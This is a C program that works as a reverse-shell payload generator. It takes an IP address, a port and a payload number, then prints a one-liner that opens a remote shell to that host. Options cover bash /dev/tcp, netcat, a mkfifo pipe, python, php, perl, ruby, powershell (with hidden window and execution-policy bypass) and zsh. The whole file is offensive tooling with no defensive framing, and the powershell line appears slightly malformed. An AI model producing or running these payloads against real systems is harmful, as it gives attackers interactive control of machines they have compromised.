#include <stdio.h>
#include <string.h>

void print_error(){

    printf("Usage: [IP ADDRESS] [PORT] [NUMBER OF PAYLOAD]\n\n");
    printf("Payload list:\n");
    printf("1. bash\n");
    printf("2. nc\n");
    printf("3. rm /tmp/f\n");
    printf("4. python\n");
    printf("5. php\n");
    printf("6. perl\n");
    printf("7. ruby\n");
    printf("8. powershell\n");
    printf("9. zsh\n");

}

int main(int argc, char * argv[]){

    if(argc != 4 || strlen(argv[1]) > 40 || strlen(argv[2]) > 5 || strlen(argv[3]) != 1) {

      print_error();

      return -1;
      
    }

    switch(argv[3][0]){

      case '1':
        printf("bash -i >& /dev/tcp/%s/%s 0>&1\n", argv[1], argv[2]);
        break;
      case '2':
        printf("nc -e /bin/bash %s %s\n", argv[1], argv[2]);
        break;
      case '3':
        printf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n", argv[1], argv[2]);
        break;
      case '4':
        printf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n", argv[1], argv[2]);
        break;
      case '5':
        printf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n", argv[1], argv[2]);
        break;
      case '6':
        printf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n", argv[1], argv[2]);
        break;
      case '7':
        printf("ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'\n", argv[1], argv[2]);
        break;
      case '8':
        printf("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"%s\",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'\n", argv[1], argv[2]);
        break;
      case '9':
        printf("zsh -c 'zmodload zsh/net/tcp && ztcp %s %s && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'\n", argv[1], argv[2]);
        break;
      default:
        printf("Wrong option");

    }

    return 0;

}
